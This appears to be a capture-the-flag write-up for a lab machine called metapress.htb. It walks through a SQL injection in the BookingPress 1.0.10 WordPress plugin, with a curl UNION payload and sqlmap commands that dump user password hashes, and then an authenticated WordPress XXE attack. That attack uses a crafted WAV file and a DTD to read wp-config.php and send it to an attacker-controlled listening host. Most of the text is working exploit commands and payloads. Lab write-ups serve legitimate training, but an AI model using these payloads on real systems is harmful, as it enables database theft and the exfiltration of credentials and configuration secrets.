Three ports are open.

  • 21/TCP FTP
  • 22/TPC SSH
  • 80/TCP HTTP
    • Add metapress.htb into /etc/hosts
    • Disallowed Entry - /wp-admin/

Web Enumeration

The Website is built on Wordpress 5.6.2 and that version is vulnerable to Authenticated XXE. Since we don’t have any credentials yet, we can’t perfome this attack for now.

Within source code of http://metapress.htb/events/ found the site is using a plugin called BookingPress 1.0.10.
And that version is vulnerable to Unauthenticated SQL Injection.

Let’s capture the web request via BurpSuite.

curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=869dc312ef&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
# _wpnonce can be found from the site source code

And save the POST request into a file and remove the injection query. And then replace the value of the vulnerable parameter into any number you want.

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 185
Content-Type: application/x-www-form-urlencoded
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=869dc312ef&category_id=33&total_service=1

Then fire up the SQLMap

sqlmap -r /ABSOLUTE/PATH/TO/post.req --batch --dbs

Dumping usernames and passwords from the wp_users table.

sqlmap -r /ABSOLUTE/PATH/TO/post.req -D blog -T wp_users -C user_pass,user_login --dump

Got the password hashes for user manager and user admin.

Since now we have the credentials for wp_admin, now we can fire up that Authenticated XXE exploit.

Now to do that we have to create two files.

Payload.wav

echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://LISTENING_IP:LISTENING_PORT/payload.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

RIFFWAVEiXML{<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://LISTENING_IP:LISTENING_PORT/payload.dtd'>%remote;%init;%trick;]>

Payload.dtd

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://LISTENING_IP:LISTENING_PORT/?p=%data;'>" >

Now host a PHP server.

php -S LISTENING_IP:LISTENING_PORT

And then upload the payload.wav into the wordpress media library and when it’s done uploading, open it. As soon as you open it, we can see a base64 code popping up in the PHP server that we just hosted.
Decode it and you will get wp-config.php.
